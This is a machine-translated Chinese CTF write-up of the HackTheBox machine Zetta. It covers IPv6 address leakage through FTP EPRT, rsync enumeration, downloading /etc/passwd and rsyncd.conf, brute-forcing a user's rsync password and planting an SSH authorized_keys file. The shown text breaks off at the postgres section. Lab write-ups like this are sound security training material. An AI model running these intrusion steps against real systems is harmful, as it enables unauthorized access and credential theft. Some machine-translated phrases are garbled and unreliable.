<html>
<head>
<title>HacktheBox — Zetta</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HacktheBox — Zetta</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-zetta-ed351dafd1b4?source=collection_archive---------0-----------------------#2020-02-22">https://infosecwriteups.com/hackthebox-zetta-ed351dafd1b4?source=collection_archive---------0-----------------------#2020-02-22</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="7d89" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一篇关于我如何从<a class="ae kl" href="http://hackthebox.eu" rel="noopener ugc nofollow" target="_blank"> Hack the Box </a>解决Zetta的文章，这是一个在线平台，在这里你可以玩各种CTF并练习你的渗透测试技能。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi km"><img src="../Images/afea159cb2300daa5cc22e8c03241551.png" data-original-src="https://miro.medium.com/v2/resize:fit:1168/format:webp/1*gv-f7CRBSSpgUYKGyKSRoA.png"/></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">https://www.hackthebox.eu/home/machines/profile/204<a class="ae kl" href="https://www.hackthebox.eu/home/machines/profile/204" rel="noopener ugc nofollow" target="_blank"/></figcaption></figure><p id="21cc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">像往常一样，我试图解释我是如何从机器上理解这些概念的，因为我想真正理解事物是如何工作的。所以请，如果我误解了一个概念，请让我知道。</p><h1 id="cd93" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">TL；速度三角形定位法(dead reckoning)</h1><p id="5db9" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">我喜欢Zetta机器，因为每一步对我来说都是新的。我花了很长时间才找到这个箱子。它的难度被评定为难。</p><p id="3a24" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，从FTP服务启动连接，泄漏IPv6地址。扫描IPv6地址显示服务rsync，它允许我上传/下载文件，导致更多的枚举。然后，我创建一个bash脚本来猜测用户的密码。对于root，我使用logger命令从日志记录中利用PostgreSQL注入，并查看用户的待办事项文件来确定root的密码方案。从这个困难的盒子里，我绝对学到了很多。</p><h1 id="6500" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">侦察</h1><p id="98b2" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">我首先运行一个nmap扫描:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="a5a4" class="mg kz iq mc b gy mh mi l mj mk"># nmap -p- -oA nmap/allports 10.10.10.156</span><span id="1018" class="mg kz iq mc b gy ml mi l mj mk">PORT   STATE SERVICE<br/>21/tcp open  ftp<br/>22/tcp open  ssh<br/>80/tcp open  http</span></pre><p id="2121" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看到服务ftp、ssh和http对TCP开放，我运行了另一个nmap，这次使用版本扫描(-sV)和默认的nmap脚本(-sC):</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="a1ca" class="mg kz iq mc b gy mh mi l mj mk">nmap -sV -sC -p21,22,80 -oA nmap/initial 10.10.10.156</span><span id="2bda" class="mg kz iq mc b gy ml mi l mj mk">PORT   STATE SERVICE VERSION<br/>21/tcp open  ftp     Pure-FTPd<br/>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 (RSA)<br/>|   256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 (ECDSA)<br/>|_  256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab (ED25519)<br/>80/tcp open  http    nginx<br/>|_http-title: Ze::a Share<br/>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre><p id="4d67" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看到正在运行的服务和它们的版本，我首先尝试连接到FTP来检查匿名登录，但这是横幅:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi mm"><img src="../Images/fc5a66429c3ce0d9f5722e36c4e3e87e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1158/format:webp/1*26s2jS_8KiuD1vXW4XcWbw.png"/></div></figure><p id="5a35" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它告诉我们，这是一个私人系统，不允许匿名登录。还要注意，它提到IPv6连接在这个服务器上也是受欢迎的。由于端口80/http是开放的，其标题为Ze::a Share(另一个线索是，我们将在这里处理有关IPv6的一些内容，因为“::”用于代替IPv6中的许多零)，所以我检查了它。</p><h2 id="2e30" class="mg kz iq bd la mn mo dn le mp mq dp li jy mr ms lm kc mt mu lq kg mv mw lu mx bi translated">超文本传送协议</h2><p id="485a" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">检查页面，有一些事情要注意。它提到他们提供NAS(网络访问存储)服务。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi my"><img src="../Images/dafac7eaf74466f0d30ea442b7fad744.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hTPWwOSyJ1r__cAgTLmIPg.png"/></div></div></figure><p id="434c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它也提到了他们做的事情。唯一有意义的就是原生FTP。其中提到了使用FXP和RFC2428的FTP。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi nd"><img src="../Images/9cfa6ec485c5a3a95000d3f0c1c06c5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5FpxUZLMsoLgChmLUqfxng.png"/></div></div></figure><p id="3034" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它还提到了“双栈”，我记得这是大学时向我介绍的一个术语，指的是设备可以同时使用IPv4和IPv6地址。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi ne"><img src="../Images/9b33b5507a68ce49d3a3caa60442b646.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sjt8aQVxoTOiVcnZLN85mQ.png"/></div></div></figure><p id="bd4e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该团队是电视剧《IT人群》中的人物。我可以在这里找到一些可能的用户。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi nf"><img src="../Images/1e99651a2f33bcb240a778c2a974b8d6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uhByNpWlCgy9LhdceyCOqQ.png"/></div></div></figure><p id="e71b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该页面还提到了我可以在FTP服务器上使用的凭证。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi ng"><img src="../Images/c9edd24a8b3964933d4e5228579ea5a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*r0KWxWvii1eYf1YgJlyl3A.png"/></div></div></figure><p id="e7f9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">他们也有一个联络区，但是没有功能。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi nh"><img src="../Images/7d1eb79bbbe340b3a9904aeed6938b46.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8WZIK8RBiToCp9phUqHAPA.png"/></div></div></figure><p id="5d5b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">查看页面的源代码，有一个生成随机32个字符串的脚本。这是用户名和密码字段。它表示FTP的登录可以是32个字符以内的任何内容。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi ni"><img src="../Images/09a11cff3112858832b6df0c686e03ef.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3fXnhyJbMAtVMxMER6n8Ug.png"/></div></div></figure><h2 id="4fab" class="mg kz iq bd la mn mo dn le mp mq dp li jy mr ms lm kc mt mu lq kg mv mw lu mx bi translated">RFC 2428</h2><p id="34d9" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">他们提到了RFC 2428。RFC代表征求意见。引用自维基百科:</p><blockquote class="nj nk nl"><p id="fd9d" class="jn jo nm jp b jq jr js jt ju jv jw jx nn jz ka kb no kd ke kf np kh ki kj kk ij bi translated">RFC由工程师和计算机科学家以T2备忘录的形式撰写，描述适用于互联网和互联网连接系统工作的方法、行为、研究或创新。提交它或者是为了<a class="ae kl" href="https://en.wikipedia.org/wiki/Peer_review" rel="noopener ugc nofollow" target="_blank">同行评审</a>或者是为了传达新概念、信息，或者偶尔是工程幽默。</p></blockquote><p id="835b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nm"> RFC2428 </em>提到了以下内容:</p><blockquote class="nj nk nl"><p id="23d7" class="jn jo nm jp b jq jr js jt ju jv jw jx nn jz ka kb no kd ke kf np kh ki kj kk ij bi translated">随着Internet协议第6版的部署，网络地址将不再是32位。本文详细说明了FTP的扩展，这些扩展将允许该协议在IPv4和IPv6上工作。</p><p id="cba1" class="jn jo nm jp b jq jr js jt ju jv jw jx nn jz ka kb no kd ke kf np kh ki kj kk ij bi translated">本文档提供了FTP为IPv4以外的网络协议传递数据连接端点信息的方式的规范。在本规范中，FTP命令PORT和PASV分别替换为EPRT和EPSV。</p><p id="5128" class="jn jo nm jp b jq jr js jt ju jv jw jx nn jz ka kb no kd ke kf np kh ki kj kk ij bi translated">EPRT命令允许为数据连接指定扩展地址<br/>。扩展地址必须由<br/>网络协议以及网络和传输地址组成。EPRT的<br/>格式是:</p></blockquote><ul class=""><li id="00d1" class="nq nr iq jp b jq jr ju jv jy ns kc nt kg nu kk nv nw nx ny bi translated"><space><d><net-prt><d><net-addr><d><tcp-port><d/></tcp-port></d></net-addr></d></net-prt></d></space></li></ul><h2 id="d9f3" class="mg kz iq bd la mn mo dn le mp mq dp li jy mr ms lm kc mt mu lq kg mv mw lu mx bi translated">FTP快速回顾:</h2><p id="ff52" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">FTP代表文件传输协议。它允许您在两台主机之间传输文件。它使用2个端口，一个用于发送命令(命令端口)，一个用于传输数据(数据端口)。数据端口因使用的模式而异。</p><p id="286f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">主动模式:</strong></p><ul class=""><li id="6200" class="nq nr iq jp b jq jr ju jv jy ns kc nt kg nu kk nv nw nx ny bi translated">客户机(在本例中是我的机器)使用一个随机端口连接到FTP服务器的端口21(Zetta box)。</li><li id="b230" class="nq nr iq jp b jq nz ju oa jy ob kc oc kg od kk nv nw nx ny bi translated">客户端告诉FTP服务器(Zetta box)“将您的端口20连接到我将定义的端口，并向该端口发送数据”。这可以使用IPv4的PORT命令和IPv6的EPRT命令来完成</li><li id="0701" class="nq nr iq jp b jq nz ju oa jy ob kc oc kg od kk nv nw nx ny bi translated">客户端向FTP服务器的端口21发送命令，服务器从端口20向客户端定义的端口发送数据</li><li id="4028" class="nq nr iq jp b jq nz ju oa jy ob kc oc kg od kk nv nw nx ny bi translated">数据连接由服务器发起</li></ul><p id="2bf1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">被动模式:</strong></p><ul class=""><li id="c367" class="nq nr iq jp b jq jr ju jv jy ns kc nt kg nu kk nv nw nx ny bi translated">客户端使用随机端口连接到FTP服务器的端口21。</li><li id="d687" class="nq nr iq jp b jq nz ju oa jy ob kc oc kg od kk nv nw nx ny bi translated">客户端询问FTP服务器“您打算为我们的数据连接打开哪个端口？请告诉我，我将连接到它”。这是通过PASV指挥部完成的。</li><li id="4ee5" class="nq nr iq jp b jq nz ju oa jy ob kc oc kg od kk nv nw nx ny bi translated">客户端确认数据连接打开的端口，并连接到该端口进行数据传输。</li><li id="03cd" class="nq nr iq jp b jq nz ju oa jy ob kc oc kg od kk nv nw nx ny bi translated">数据连接由客户端发起</li></ul><p id="c3ef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">知道了这一切，这一切都导致了一个线索，我可以泄漏机器的IPv6地址，它可能会泄露正在运行的其他服务。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi oe"><img src="../Images/3b2fd6ece95370b90f3606f02bcfba5c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1170/format:webp/1*dfXdYDOL32u2PWndhOfRWQ.png"/></div></figure><p id="ce79" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了验证FTP登录是否接受任何32个字符的用户名和密码，我使用32个字符进行了验证，并且成功了。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi of"><img src="../Images/ccc986ce08bf8a94b3b8020fa48b2235.png" data-original-src="https://miro.medium.com/v2/resize:fit:1164/format:webp/1*sAqKtu0FctJH-O6l6slnww.png"/></div></figure><p id="16d2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我试图了解如何在基于RFC的IPv6中使用端口。我还设置了我的监听器，给它我的IPv6地址，并运行一个LIST命令(比如dir或ls)。我从盒子里得到一个连接，显示出它的IPv6地址。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi og"><img src="../Images/96b284af351de66b69308be5bc0a81fa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1178/format:webp/1*fTqAKE3_XqZ0GBgvJldl9Q.png"/></div></figure><h2 id="8a1f" class="mg kz iq bd la mn mo dn le mp mq dp li jy mr ms lm kc mt mu lq kg mv mw lu mx bi translated">枚举IPv6地址</h2><p id="b1da" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">我尝试ping IPv6地址，得到回应。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oh"><img src="../Images/0d4bd2af27c2589da2510a278b9c3b80.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pTIYstPdaRt4m975RQzhEQ.png"/></div></div></figure><p id="c4aa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我尝试使用主机的IPv6地址对其运行nmap扫描:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="caf9" class="mg kz iq mc b gy mh mi l mj mk"># nmap -6 -sV -sC dead:beef::250:56ff:feb9:5dfd</span></pre><p id="2947" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">结果显示与前一次扫描相同的端口和相同的ssh-hostkey(对于每个框应该是唯一的)。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oi"><img src="../Images/db2cd8696a34f51afe502811fcbfea60.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*d9mW31bUSg7aPKLduO6xUQ.png"/></div></div></figure><p id="be17" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我还试图运行TCP所有端口扫描，它显示端口8730是开放的。</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="bdc2" class="mg kz iq mc b gy mh mi l mj mk"># nmap -6 -p- dead:beef::250:56ff:feb9:5dfd</span><span id="4519" class="mg kz iq mc b gy ml mi l mj mk">PORT     STATE SERVICE<br/>21/tcp   open  ftp<br/>22/tcp   open  ssh<br/>80/tcp   open  http<br/>8730/tcp open  unknown</span></pre><p id="64f9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我运行了版本扫描和默认脚本扫描，以了解有关该服务的更多信息。扫描显示端口8730上运行的服务是rsync。</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="e27a" class="mg kz iq mc b gy mh mi l mj mk"># nmap -6 -p 8730 -sV -sC dead:beef::250:56ff:feb9:5dfd</span><span id="f25a" class="mg kz iq mc b gy ml mi l mj mk">PORT     STATE SERVICE VERSION<br/>8730/tcp open  rsync   (protocol version 31)</span></pre><h2 id="4fa1" class="mg kz iq bd la mn mo dn le mp mq dp li jy mr ms lm kc mt mu lq kg mv mw lu mx bi translated">RSYNC</h2><p id="d5c8" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">根据手册页，rsync是一个快速、通用的远程(和本地)文件复制工具。我枚举rsync上可用模块的一种方法是通过Metasploit。通过使用辅助/scanner/rsync/modules_list，我可以看到找到了9个模块。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oj"><img src="../Images/1bc9d0df91cd3aa013fea6d3910f2784.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FapOFuCzHLe-AnoKqEh-HQ.png"/></div></div></figure><p id="f36f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我还可以使用以下语法连接到rsync守护进程:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="45e1" class="mg kz iq mc b gy mh mi l mj mk">rsyncrsync://IPADDR:RsyncPort</span></pre><p id="2404" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我尝试连接到rsync服务。请注意，在处理IPv6地址时，您应该将它们放在括号内:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="77e8" class="mg kz iq mc b gy mh mi l mj mk">rsync rsync://[dead:beef::250:56ff:feb9:5dfd]:8730</span></pre><p id="a981" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">rsync服务器横幅和可用模块提示我，同时提到连接到服务器是非法的。知道这是一个CTF，我可以忽略警告。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/6bf2bde482e359ce68747149f1e4d249.png" data-original-src="https://miro.medium.com/v2/resize:fit:1262/format:webp/1*z5f19mGqb-Z9qGnA18Yp-A.png"/></div></figure><p id="2df8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意，列出的模块通常位于Linux目录“/”下。我试着列出其中一个模块，但是被拒绝了。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi ol"><img src="../Images/176560cdb18ca7b1ca6b78d1e1a5822e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EaOSIKV8RT7Fd160H5ow8g.png"/></div></div></figure><p id="1268" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">“/”下缺少的目录之一是/etc。我尝试在/etc下列出文件。我好像有权限。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi om"><img src="../Images/c088df86d610d11e2900ffbc256b21e5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-Fx9916qVYZCwrpKeUzESw.png"/></div></div></figure><p id="5777" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试图检查我是否有权访问通常被配置为任何人都可以读取的文件。其中之一是/etc/passwd文件。它具有最小权限，因为系统中的许多进程需要读取权限来确定某些用户的权限。说到这里，我试着下载了/etc/passwd，成功了。我能看到用户，其中一个是罗伊。我将副本下载到我的本地计算机:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="cdf2" class="mg kz iq mc b gy mh mi l mj mk">rsync -r rsync://[dead:beef::250:56ff:feb9:5dfd]:8730/etc/passwd .</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi on"><img src="../Images/4dfb80a7c2a1cf4559d7391a66058b3e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*v0jDbQtN-vzK_tA8kajkQQ.png"/></div></div></figure><p id="b4a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">深入查看rsync的文档，我可以检查配置文件是否在/etc/rsyncd.conf中</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oo"><img src="../Images/6fd7927589127bd44385019e1898a17d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*g8dMPb3alwEC9yRofrKO_Q.png"/></div></div></figure><p id="71ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我拿了一份，在本地阅读:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi op"><img src="../Images/3993fc348ab8d944d3b60db25baac301.png" data-original-src="https://miro.medium.com/v2/resize:fit:1268/format:webp/1*K4WYrUrqdrTRdx9b8UyfGA.png"/></div></figure><p id="91e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">默认情况下，Rsync监听端口873。我可以在配置文件中看到它被修改为监听端口8730。这就是nmap最初无法识别正在运行的服务的原因。检查模块的配置，将/etc配置为排除。git和to不被列出。但是这个配置并不妨碍任何人猜测模块的名称。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oq"><img src="../Images/54ef43c0247a915fe48a20abf99b839c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WIXcHaMi24Eswb2XuQM59A.png"/></div></div></figure><p id="e3df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在配置文件的下半部分，有一个名为home_roy的模块，它映射到/home/roy目录。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/7bf13274cd36778af8c3ca883890647f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1262/format:webp/1*0RT4e2opagwoaVZxRBP4XA.png"/></div></figure><p id="2c3f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">知道只有罗伊可以访问它，我需要能够得到罗伊的密码。我尝试与home_roy模块同步，它要求我输入密码。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi or"><img src="../Images/0b6bbd6b15f9f6f53875c306e45a8f4b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6kstNncZH700sVaedxDSVA.png"/></div></div></figure><p id="d701" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我能猜出roy的密码，但是有提示，导致手动操作要花费更多的时间。我研究了发送密码的其他方法，发现可以通过设置环境变量来实现。我使用bash脚本诉诸暴力。</p><figure class="kn ko kp kq gt kr"><div class="bz fp l di"><div class="os ot l"/></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated"><a class="ae kl" href="https://gist.github.com/red0man/0d1a13736e26e940ec11289b5fe0760b" rel="noopener ugc nofollow" target="_blank"> zetta-rsync-brute </a></figcaption></figure><p id="561c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行脚本:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ou"><img src="../Images/fd2b814260f2f609e0cd6a59f54bd1dd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1016/format:webp/1*rwkEtww-X-2iZowKErlMoQ.png"/></div></figure><p id="6006" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">脚本在密码“计算机”处停止。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ov"><img src="../Images/a39a207d363903121cf287b87e67898e.png" data-original-src="https://miro.medium.com/v2/resize:fit:734/format:webp/1*ZFjlb2HMVKH9jzx7mMtfVw.png"/></div></figure><p id="86c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我尝试同步到home_roy，现在可以看到/home/roy下的文件。然后，我将尝试rsync一个. ssh目录，在authorized_keys文件下包含我的公钥，并尝试将ssh放入这个框中。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi ow"><img src="../Images/d653ac891111c0e17df6d02bea7b5f9a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xx4XtpV3Sag-9NFFVh2p7g.png"/></div></div></figure><p id="23d4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我首先使用ssh-keygen创建一个密钥对:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ox"><img src="../Images/e0496d60869307c5aed4906de33fceb1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1272/format:webp/1*saDyLAwL7NhpUIQKJY7pDg.png"/></div></figure><p id="a45e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我将我的公钥重命名为authorized_keys，使用rsync删除整个ssh文件夹，并更改我的私钥的权限。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oy"><img src="../Images/5a40e0d09198ecbd3a9345037ef59eea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*y_ZYr2pmsjkLNUkUAAUNgw.png"/></div></div></figure><p id="d135" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我使用ssh登录，现在可以读取user.txt。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oz"><img src="../Images/599419fd58b2ff8bd837b5e643f17e72.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*M7IIDiPwg9aJyL0AnSeAkQ.png"/></div></div></figure><h1 id="22a4" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">罗伊→波斯特格里斯</h1><p id="a23a" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">请注意，有一个. tudu.xml文件:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi pa"><img 